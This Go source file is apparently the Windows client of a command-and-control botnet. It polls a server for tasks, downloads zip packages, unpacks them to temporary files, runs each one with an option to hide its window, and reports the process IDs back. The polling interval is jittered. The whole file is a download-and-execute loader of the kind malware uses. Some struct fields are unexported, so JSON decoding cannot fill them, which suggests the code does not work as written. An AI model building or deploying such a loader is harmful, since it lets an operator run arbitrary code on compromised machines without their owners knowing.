//go:build windows

package main

import (
	"archive/zip"
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand/v2"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"sync"
	"syscall"
	"time"
)

type C2Profile struct {
	bot_id string
	client *http.Client
	addr   string
	token  string
	jitter time.Duration
}

type C2Task struct {
	task_id      string
	task_status  string
	package_name string
	package_hash string
	hide_window  bool
}

func (profile *C2Profile) makeRequest(url string, method string, cookie *http.Cookie) (*http.Response, error) {
	req, err := http.NewRequest(
		method,
		url,
		nil,
	)
	if err != nil {
		return nil, err
	}

	if cookie != nil {
		req.AddCookie(cookie)
	} else {
		req.Header.Add("X-Api-Token", profile.token)
	}

	res, err := profile.client.Do(req)
	if err != nil {
		return nil, err
	}

	return res, nil
}

func readFull(body io.ReadCloser, length uint64) ([]byte, error) {
	chunks := make([]byte, 0)

	offset := uint64(0)
	for offset < length {
		chunkSize := min(1024, length-offset)

		chunk := make([]byte, chunkSize)
		if _, err := body.Read(chunk); err != nil {
			if err == io.EOF {
				break
			}

			return nil, err
		}

		chunks = append(chunks, chunk...)
		offset += chunkSize
	}

	return chunks, nil
}

func writeFull(chunks []byte, ext string) (string, error) {
	length := uint64(len(chunks))

	file, err := os.CreateTemp("", "*"+ext)
	if err != nil {
		return "", err
	}
	defer file.Close()

	reader := bytes.NewReader(chunks)

	offset := uint64(0)
	for offset < length {
		chunkSize := min(1024, length-offset)

		chunk := make([]byte, chunkSize)
		if _, err := reader.Read(chunk); err != nil {
			if err == io.EOF {
				break
			}

			return "", err
		}

		if _, err = file.Write(chunk); err != nil {
			return "", err
		}

		offset += chunkSize
	}

	return file.Name(), nil
}

func unzipArchive(path string) ([]string, error) {
	newPaths := make([]string, 0)

	zr, err := zip.OpenReader(path)
	if err != nil {
		return nil, err
	}
	defer zr.Close()

	for _, file := range zr.File {
		entry, err := file.Open()
		if err != nil {
			return nil, err
		}
		defer entry.Close()

		chunks, err := readFull(entry, file.UncompressedSize64)
		if err != nil {
			return nil, err
		}

		newPath, err := writeFull(chunks, filepath.Ext(file.Name))
		if err != nil {
			return nil, err
		}

		newPaths = append(newPaths, newPath)
	}

	return newPaths, nil
}

func computeHash(chunks []byte) string {
	digest := sha256.Sum256(chunks)

	return hex.EncodeToString(digest[:])
}

func main() {
	profile := &C2Profile{
		client: &http.Client{
			Timeout: time.Duration(3200) * time.Millisecond,
		},
		token:  "",
		addr:   "http://127.0.0.1:8080",
		jitter: time.Duration(rand.IntN(30000)) * time.Millisecond,
	}

	authRes, err := profile.makeRequest(fmt.Sprintf("%s/api/auth.php", profile.addr), "GET", nil)
	if err != nil {
		log.Fatalln(err)
	}

	for _, cookie := range authRes.Cookies() {
		if cookie.Name == ".auth_id" {
			queue := make([]C2Task, 0)
			for {
				taskRes, err := profile.makeRequest(fmt.Sprintf("%s/api/task.php", profile.addr), "GET", cookie)
				if err != nil {
					log.Fatalln(err)
				}

				decoder := json.NewDecoder(taskRes.Body)

				task := C2Task{}
				if err = decoder.Decode(&task); err != nil {
					log.Println(err)
				}

				for _, old := range queue {
					if old.task_id == task.task_id {
						task.task_status = "finished"
					}
				}

				if task.task_status == "ready" {
					queue = append(queue, task)

					downRes, err := profile.makeRequest(fmt.Sprintf("%s/packages/%s", profile.addr, task.package_name), "GET", cookie)
					if err != nil {
						log.Println(err)
					}

					length := uint64(downRes.ContentLength)

					chunks, err := readFull(downRes.Body, length)
					if err != nil {
						log.Println(err)
					}

					computed := computeHash(chunks)
					if computed != task.package_hash {
						// possible tampering with package
						break
					}

					packagePath, err := writeFull(chunks, filepath.Ext(task.package_name))
					if err != nil {
						log.Println(err)
					}

					newPaths, err := unzipArchive(packagePath)
					if err != nil {
						log.Fatalln(err)
					}

					wg := sync.WaitGroup{}
					for _, newPath := range newPaths {
						wg.Add(1)
						go func() {
							defer wg.Done()

							cmd := exec.Command(newPath)
							cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: task.hide_window}

							if err = cmd.Start(); err != nil {
								log.Println(err)

								if _, err = profile.makeRequest(fmt.Sprintf("%s/api/report.php?task_id=%s&status=error&proc_id=0", profile.addr, task.task_id), "GET", cookie); err != nil {
									log.Println(err)
								}

								return
							}

							if _, err = profile.makeRequest(fmt.Sprintf("%s/api/report.php?task_id=%s&status=ok&proc_id=%d", profile.addr, task.task_id, cmd.Process.Pid), "GET", cookie); err != nil {
								log.Println(err)
							}
						}()
					}

					wg.Wait()
				}

				time.Sleep(profile.jitter)
			}
		}
	}
}
